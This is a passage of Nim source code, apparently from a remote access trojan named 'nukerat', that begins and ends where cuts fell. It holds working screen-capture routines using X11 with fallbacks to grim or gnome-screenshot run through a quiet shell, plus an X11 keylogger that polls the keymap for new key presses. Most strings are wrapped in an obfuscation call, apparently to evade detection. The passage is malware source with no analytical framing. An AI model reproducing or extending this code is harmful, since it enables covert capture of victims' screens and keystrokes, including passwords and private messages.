        if w > 0 and h > 0:
          return ""
  if fallbackCaptureAvailable():
    return ""
  if getenv(displayEnvKey.cstring) == nil and not sessionIsWayland():
    return obf("No graphical display (DISPLAY not set)")
  if not loadX11():
    return obf("X11 library not available")
  obf("Cannot connect to X display")

proc captureScreenViaTools*(): ScreenCapture =
  # Captures the screen through grim or gnome-screenshot when x11 fails
  result.ok = false
  if not fallbackCaptureAvailable():
    result.error = obf("No fallback screen capture tool found")
    return
  let outPath = obf("/tmp/nukerat-scr-") & $getpid() & obf(".png")
  defer:
    if pathExists(outPath):
      discard unlink(outPath.cstring)
  var cmd = ""
  let grimPath = grimBinaryPath()
  if grimPath.len > 0:
    cmd = grimPath & obf(" ") & outPath
  elif pathExists(gnomeScreenshotBin):
    cmd = gnomeScreenshotBin & obf(" -f ") & outPath
  else:
    result.error = obf("No fallback screen capture tool found")
    return
  if not runShellQuiet(cmd):
    result.error = obf("Screen capture tool failed")
    return
  let file = readFileBytes(outPath)
  if not file.ok or file.data.len == 0:
    if file.error.len > 0:
      result.error = file.error
    else:
      result.error = obf("Screen capture returned empty image")
    return
  result.png = file.data
  result.ok = true

proc captureScreenBgra*(): ScreenCapture =
  # Captures the screen into bgra bytes
  result.ok = false
  let pre = pretestCapture()
  if pre.len > 0:
    result.error = pre
    return
  try:
    if not loadX11() or xOpenDisplayFn == nil:
      if fallbackCaptureAvailable():
        return captureScreenViaTools()
      result.error = obf("X11 library not available")
      return
    let disp = xOpenDisplayFn(nil)
    if cast[pointer](disp) == nil:
      if fallbackCaptureAvailable():
        return captureScreenViaTools()
      result.error = obf("Cannot connect to X display")
      return
    defer:
      xCloseDisplayFn(disp)
    let screen = xDefaultScreenFn(disp)
    let scrW = xDisplayWidthFn(disp, screen).int
    let scrH = xDisplayHeightFn(disp, screen).int
    if scrW <= 0 or scrH <= 0:
      result.error = obf("Invalid screen size")
      return
    let root = xDefaultRootWindowFn(disp)
    x11CaptureErrorCode = 0
    let img = xGetImageFn(disp, root, 0, 0, scrW.cuint, scrH.cuint, xAllPlanes, xZPixmap)
    if img == nil:
      if fallbackCaptureAvailable():
        return captureScreenViaTools()
      if x11CaptureErrorCode != 0:
        result.error = obf("X11 screen capture failed (X error ") & $x11CaptureErrorCode & ")"
      else:
        result.error = obf("Screen capture failed")
      return
    defer:
      discard xDestroyImageFn(img)
    if img.data == nil:
      result.error = obf("Screen capture returned no image data")
      return
    let imgW = img.width.int
    let imgH = img.height.int
    if imgW <= 0 or imgH <= 0 or img.bits_per_pixel <= 0 or img.bytes_per_line <= 0:
      result.error = obf("Invalid captured image format")
      return
    result.w = imgW
    result.h = imgH
    result.stride = result.w * 4
    result.data.setLen(result.stride * result.h)
    let rs = maskShift(img.red_mask)
    let gs = maskShift(img.green_mask)
    let bs = maskShift(img.blue_mask)
    for y in 0 ..< result.h:
      for x in 0 ..< result.w:
        let px = readXPixel(img, x, y)
        let r = byte((px and img.red_mask) shr culong(rs))
        let g = byte((px and img.green_mask) shr culong(gs))
        let b = byte((px and img.blue_mask) shr culong(bs))
        let off = y * result.stride + x * 4
        result.data[off] = b
        result.data[off + 1] = g
        result.data[off + 2] = r
        result.data[off + 3] = 255'u8
    result.ok = true
  except CatchableError as e:
    result.error = e.msg

# ======================
# x11 / keylog
# ======================

const xKeymapBytes* = 32

type X11KeySession* = object
  ok*: bool
  error*: string
  disp*: Display
  minKc*, maxKc*: cint

proc pretestKeylog*(): string =
  # Checks that key logging can start
  if getenv(displayEnvKey.cstring) == nil:
    return obf("No graphical display (DISPLAY not set)")
  if not loadX11():
    return obf("X11 library not available")
  let disp = xOpenDisplayFn(nil)
  if cast[pointer](disp) == nil:
    return obf("Cannot connect to X display")
  defer:
    xCloseDisplayFn(disp)
  ""

proc startX11KeySession*(): X11KeySession =
  # Opens an x11 session for key logging
  result.ok = false
  let pre = pretestKeylog()
  if pre.len > 0:
    result.error = pre
    return
  try:
    result.disp = xOpenDisplayFn(nil)
    if cast[pointer](result.disp) == nil:
      result.error = obf("Cannot connect to X display")
      return
    var minKc, maxKc: cint
    if xDisplayKeycodesFn(result.disp, addr minKc, addr maxKc) == 0:
      xCloseDisplayFn(result.disp)
      result.disp = Display(nil)
      result.error = obf("Cannot read keycodes")
      return
    result.minKc = minKc
    result.maxKc = maxKc
    result.ok = true
  except CatchableError as e:
    result.error = e.msg

proc stopX11KeySession*(session: var X11KeySession) =
  # Closes an x11 key logging session
  if cast[pointer](session.disp) != nil:
    xCloseDisplayFn(session.disp)
    session.disp = Display(nil)
  session.ok = false

proc readX11KeyPresses*(session: X11KeySession; last: var seq[bool]): seq[culong] =
  # Reads keys that were newly pressed
  if not session.ok or cast[pointer](session.disp) == nil:
    return @[]
  if last.len <= session.maxKc:
    last.setLen(session.maxKc + 1)
  var keys: array[xKeymapBytes, char]
  if xQueryKeymapFn(session.disp, addr keys) == 0:
    return @[]
  for kc in session.minKc .. session.maxKc:
    let idx = kc.int
    let down = (ord(keys[idx div 8]) and (1 shl (idx mod 8))) != 0
    if down and not last[idx]:
      result.add xKeycodeToKeysymFn(session.disp, kc.cuint, 0)
    last[idx] = down
